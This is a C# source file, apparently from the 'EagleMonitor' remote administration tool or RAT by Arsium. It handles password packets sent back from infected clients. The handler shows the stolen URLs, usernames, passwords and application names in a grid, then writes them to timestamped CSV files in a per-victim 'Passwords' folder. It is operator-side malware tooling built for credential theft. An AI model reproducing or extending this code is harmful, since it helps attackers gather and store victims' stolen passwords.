using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Windows.Forms;
using EagleMonitor.Utils;
using System;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class PasswordsPacketHandler
    {
        public PasswordsPacketHandler(PasswordsPacket passwordsPacket, ClientHandler clientHandler)
        {
            /*clientHandler.passwordsForm.dataGridView1.Invoke((MethodInvoker)(() =>
            {
                clientHandler.passwordsForm.dataGridView1.Rows.Clear();
                foreach (object[] str in packet.passwordsList)
                {
                    int rowId = clientHandler.passwordsForm.dataGridView1.Rows.Add();
                    DataGridViewRow row = clientHandler.passwordsForm.dataGridView1.Rows[rowId];
                    row.Cells["Column1"].Value = str[0].ToString();
                    row.Cells["Column2"].Value = str[1].ToString();
                    row.Cells["Column3"].Value = str[2].ToString();
                    row.Cells["Column4"].Value = str[3].ToString();
                }
            }));*/
            new Thread(() =>
            {
                if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Passwords\\"))
                    System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords");

                try
                {
                    if (clientHandler.passwordsForm.dataGridView1 != null)
                    {
                        clientHandler.passwordsForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            clientHandler.passwordsForm.dataGridView1.Rows.Clear();
                            foreach (object[] str in passwordsPacket.passwordsList)
                            {
                                int rowId = clientHandler.passwordsForm.dataGridView1.Rows.Add();
                                DataGridViewRow row = clientHandler.passwordsForm.dataGridView1.Rows[rowId];
                                row.Cells["Column1"].Value = str[0].ToString();
                                row.Cells["Column2"].Value = str[1].ToString();
                                row.Cells["Column3"].Value = str[2].ToString();
                                row.Cells["Column4"].Value = str[3].ToString();
                            }
                            Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + DateTime.Now.ToString().Replace(":", "") + ".csv");
                            clientHandler.passwordsForm.loadingCircle1.Visible = false;
                            clientHandler.passwordsForm.loadingCircle1.Active = false;
                            passwordsPacket = null;
                        }));
                    }
                    else
                    { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + DateTime.Now.ToString().Replace(":", "") + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                    return;
                }
                catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + DateTime.Now.ToString().Replace(":", "") + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
            }).Start();
        }
    }
}
// sw.Write(string.Format("{0};", "URL"));
// sw.Write(string.Format("{0};", "Username"));
// sw.Write(string.Format("{0};", "Password"));
// sw.Write(string.Format("{0};", "Application"));